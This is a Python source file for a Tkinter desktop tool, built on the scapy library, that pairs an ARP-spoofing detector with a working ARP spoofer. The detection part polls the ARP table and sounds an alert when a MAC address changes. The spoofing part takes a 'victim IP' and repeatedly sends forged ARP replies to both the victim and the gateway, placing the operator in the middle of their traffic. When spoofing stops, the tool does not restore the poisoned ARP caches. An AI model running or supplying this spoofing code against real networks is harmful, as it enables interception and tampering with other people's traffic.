import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import time
import subprocess
import sys
import re
import os
from scapy.all import ARP, Ether, sendp, srp, conf, get_if_addr

def run_arp_detector():
    detector_window = tk.Toplevel()
    detector_window.title("ARP Spoofer Detector & Spoofer")
    detector_window.geometry("900x700")
    detector_window.configure(bg="#0f111a")
    
    ARPSpooferDetector(detector_window)

class ARPSpooferDetector:
    def __init__(self, parent):
        self.parent = parent
        self.monitoring = False
        self.spoofing = False
        self.attacker_mac = None
        self.gateway_ip = None
        self.gateway_mac = None
        self.victim_ip = None
        self.victim_mac = None
        self.iface = None
        self.setup_ui()
        
    def setup_ui(self):
        main_frame = tk.Frame(self.parent, bg="#0f111a")
        main_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        tk.Label(main_frame, text="🛡️ ARP Spoofer Detector & Spoofer", font=("Consolas", 16, "bold"),
                fg="#00fff7", bg="#0f111a").pack(pady=10)
        
        # Detection controls
        detection_frame = tk.Frame(main_frame, bg="#0f111a")
        detection_frame.pack(fill='x', pady=10)
        
        self.monitor_btn = tk.Button(detection_frame, text="Start Monitoring", command=self.toggle_monitoring,
                                   bg="#141627", fg="#00fff7", font=("Consolas", 12))
        self.monitor_btn.pack(side='left', padx=5)
        
        tk.Button(detection_frame, text="Manual ARP Scan", command=self.manual_scan,
                 bg="#141627", fg="#00fff7", font=("Consolas", 12)).pack(side='left', padx=5)
        
        # Spoofing controls
        spoof_frame = tk.Frame(main_frame, bg="#0f111a")
        spoof_frame.pack(fill='x', pady=10)
        
        tk.Label(spoof_frame, text="Victim IP:", font=("Consolas", 12),
                fg="#00fff7", bg="#0f111a").pack(side='left')
        
        self.victim_entry = tk.Entry(spoof_frame, width=15, bg="#1f2233", fg="#00fff7",
                                   font=("Consolas", 12), insertbackground="#00fff7")
        self.victim_entry.pack(side='left', padx=5)
        
        self.spoof_btn = tk.Button(spoof_frame, text="Start Spoofing", command=self.toggle_spoofing,
                                 bg="#ff4444", fg="white", font=("Consolas", 12))
        self.spoof_btn.pack(side='left', padx=5)
        
        tk.Button(spoof_frame, text="Stop All", command=self.stop_all,
                 bg="#ff0000", fg="white", font=("Consolas", 12)).pack(side='left', padx=5)
        
        # Network info
        info_frame = tk.Frame(main_frame, bg="#0f111a")
        info_frame.pack(fill='x', pady=5)
        
        self.network_info = tk.Label(info_frame, text="Network Info: Not initialized", 
                                   font=("Consolas", 10), fg="#00ff9d", bg="#0f111a")
        self.network_info.pack(side='left')
        
        # Results
        tk.Label(main_frame, text="ARP Table & Alerts:", font=("Consolas", 12, "bold"),
                fg="#00fff7", bg="#0f111a").pack(anchor='w', pady=(20,5))
        
        self.results_text = scrolledtext.ScrolledText(main_frame, height=20, bg="#1f2233", 
                                                     fg="#00fff7", font=("Consolas", 10))
        self.results_text.pack(fill='both', expand=True)
        
        # Initialize network info
        self.initialize_network()
        
    def initialize_network(self):
        try:
            self.iface = conf.iface
            attacker_ip = get_if_addr(self.iface)
            self.attacker_mac = self.getmac(attacker_ip)
            self.gateway_ip = self.get_gateway_ip()
            self.gateway_mac = self.getmac(self.gateway_ip)
            
            info_text = f"Interface: {self.iface} | "
            info_text += f"Attacker: {attacker_ip} ({self.attacker_mac}) | "
            info_text += f"Gateway: {self.gateway_ip} ({self.gateway_mac})"
            
            self.network_info.config(text=info_text)
            self.results_text.insert(tk.END, f"[+] Network initialized\n")
            self.results_text.insert(tk.END, f"    Interface: {self.iface}\n")
            self.results_text.insert(tk.END, f"    Attacker IP: {attacker_ip}\n")
            self.results_text.insert(tk.END, f"    Gateway IP: {self.gateway_ip}\n\n")
            
        except Exception as e:
            self.results_text.insert(tk.END, f"[-] Error initializing network: {str(e)}\n")
            self.network_info.config(text="Network Info: Error - Run as Administrator")
            
    def get_gateway_ip(self):
        try:
            with os.popen("ip route | grep default") as f:
                return f.read().split()[2]
        except:
            # Fallback for Windows
            try:
                result = subprocess.run(['route', 'print', '0.0.0.0'], 
                                      capture_output=True, text=True, shell=True)
                lines = result.stdout.split('\n')
                for line in lines:
                    if '0.0.0.0' in line and '255.255.255.255' not in line:
                        parts = line.split()
                        if len(parts) > 3:
                            return parts[3]
            except:
                pass
        return "192.168.1.1"  # Default fallback
        
    def getmac(self, ip):
        try:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            ans, _ = srp(pkt, timeout=2, verbose=False)
            if ans:
                return ans[0][1].hwsrc
        except:
            pass
        return None
        
    def arp_scan(self, subnet):
        try:
            self.results_text.insert(tk.END, f"[+] Scanning network {subnet}...\n")
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)
            ans, _ = srp(pkt, timeout=2, verbose=False)
            live_hosts = []
            for snd, rcv in ans:
                live_hosts.append((rcv.psrc, rcv.hwsrc))
            return live_hosts
        except Exception as e:
            self.results_text.insert(tk.END, f"[-] Error during ARP scan: {str(e)}\n")
            return []
            
    def toggle_monitoring(self):
        if not self.monitoring:
            self.monitoring = True
            self.monitor_btn.config(text="Stop Monitoring", bg="#ff4444")
            self.results_text.insert(tk.END, "🔄 Starting ARP monitoring...\n")
            monitor_thread = threading.Thread(target=self.monitor_arp)
            monitor_thread.daemon = True
            monitor_thread.start()
        else:
            self.monitoring = False
            self.monitor_btn.config(text="Start Monitoring", bg="#141627")
            self.results_text.insert(tk.END, "⏹️ Stopped ARP monitoring.\n")
            
    def monitor_arp(self):
        previous_arp = {}
        self.results_text.insert(tk.END, "📡 Monitoring ARP table for changes...\n\n")
        
        while self.monitoring:
            try:
                current_arp = self.get_arp_table()
                
                # Compare with previous table
                for ip, mac in current_arp.items():
                    if ip in previous_arp and previous_arp[ip] != mac:
                        alert_msg = f"🚨 ARP SPOOFING DETECTED!\n"
                        alert_msg += f"   IP: {ip}\n"
                        alert_msg += f"   Old MAC: {previous_arp[ip]}\n"
                        alert_msg += f"   New MAC: {mac}\n"
                        alert_msg += f"   Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                        self.results_text.insert(tk.END, alert_msg)
                        self.results_text.see(tk.END)
                        self.parent.bell()  # Alert sound
                        
                previous_arp = current_arp.copy()
                time.sleep(5)  # Check every 5 seconds
                
            except Exception as e:
                if self.monitoring:
                    self.results_text.insert(tk.END, f"Error: {str(e)}\n")
                break
                
    def get_arp_table(self):
        arp_table = {}
        try:
            if sys.platform.startswith('win'):
                result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                for line in lines:
                    match = re.search(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F\-]+)', line)
                    if match:
                        ip, mac = match.groups()
                        arp_table[ip] = mac.replace('-', ':').lower()
            else:
                result = subprocess.run(['arp', '-n'], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                for line in lines:
                    match = re.search(r'(\d+\.\d+\.\d+\.\d+).*?([0-9a-fA-F:]{17})', line)
                    if match:
                        ip, mac = match.groups()
                        arp_table[ip] = mac.lower()
        except Exception as e:
            self.results_text.insert(tk.END, f"Error getting ARP table: {str(e)}\n")
            
        return arp_table
        
    def manual_scan(self):
        try:
            attacker_ip = get_if_addr(self.iface)
            subnet = attacker_ip.rsplit('.', 1)[0] + '.0/24'
            hosts = self.arp_scan(subnet)
            
            self.results_text.insert(tk.END, f"[+] Found {len(hosts)} live hosts:\n")
            for ip, mac in hosts:
                self.results_text.insert(tk.END, f"    {ip:15} -> {mac}\n")
            self.results_text.insert(tk.END, "\n")
            self.results_text.see(tk.END)
            
        except Exception as e:
            self.results_text.insert(tk.END, f"[-] Error during manual scan: {str(e)}\n")
            
    def toggle_spoofing(self):
        if not self.spoofing:
            victim_ip = self.victim_entry.get().strip()
            if not victim_ip:
                messagebox.showerror("Error", "Please enter a victim IP address.", parent=self.parent)
                return
                
            # Validate victim IP
            if not self.validate_ip(victim_ip):
                messagebox.showerror("Error", "Invalid IP address format.", parent=self.parent)
                return
                
            # Get victim MAC
            victim_mac = self.getmac(victim_ip)
            if not victim_mac:
                messagebox.showerror("Error", f"Could not resolve MAC for {victim_ip}", parent=self.parent)
                return
                
            self.victim_ip = victim_ip
            self.victim_mac = victim_mac
            
            self.spoofing = True
            self.spoof_btn.config(text="Stop Spoofing", bg="#ff0000")
            self.results_text.insert(tk.END, f"[+] Starting ARP spoofing...\n")
            self.results_text.insert(tk.END, f"    Victim: {self.victim_ip} ({self.victim_mac})\n")
            self.results_text.insert(tk.END, f"    Gateway: {self.gateway_ip} ({self.gateway_mac})\n")
            self.results_text.insert(tk.END, f"    Attacker: {self.attacker_mac}\n\n")
            
            spoof_thread = threading.Thread(target=self.arp_spoof)
            spoof_thread.daemon = True
            spoof_thread.start()
        else:
            self.stop_spoofing()
            
    def validate_ip(self, ip):
        try:
            parts = ip.split('.')
            if len(parts) != 4:
                return False
            for part in parts:
                if not 0 <= int(part) <= 255:
                    return False
            return True
        except:
            return False
            
    def arp_spoof(self):
        try:
            self.results_text.insert(tk.END, "[+] ARP spoofing started. Press 'Stop Spoofing' to stop.\n")
            
            while self.spoofing:
                # Spoof victim -> pretend to be gateway
                self.spoof(self.victim_ip, self.victim_mac, self.gateway_ip, self.attacker_mac, self.iface)
                
                # Spoof gateway -> pretend to be victim
                self.spoof(self.gateway_ip, self.gateway_mac, self.victim_ip, self.attacker_mac, self.iface)
                
                time.sleep(2)
                
        except Exception as e:
            self.results_text.insert(tk.END, f"[-] Error during spoofing: {str(e)}\n")
        finally:
            self.spoofing = False
            self.spoof_btn.config(text="Start Spoofing", bg="#ff4444")
            
    def spoof(self, victim_ip, victim_mac, spoof_ip, attacker_mac, iface):
        try:
            packet = Ether(dst=victim_mac, src=attacker_mac) / ARP(
                op=2, psrc=spoof_ip, pdst=victim_ip, hwdst=victim_mac, hwsrc=attacker_mac
            )
            sendp(packet, iface=iface, verbose=False)
        except Exception as e:
            self.results_text.insert(tk.END, f"[-] Error sending spoof packet: {str(e)}\n")
            
    def stop_spoofing(self):
        self.spoofing = False
        self.spoof_btn.config(text="Start Spoofing", bg="#ff4444")
        self.results_text.insert(tk.END, "[+] ARP spoofing stopped.\n")
        
    def stop_all(self):
        self.monitoring = False
        self.spoofing = False
        self.monitor_btn.config(text="Start Monitoring", bg="#141627")
        self.spoof_btn.config(text="Start Spoofing", bg="#ff4444")
        self.results_text.insert(tk.END, "[+] All operations stopped.\n")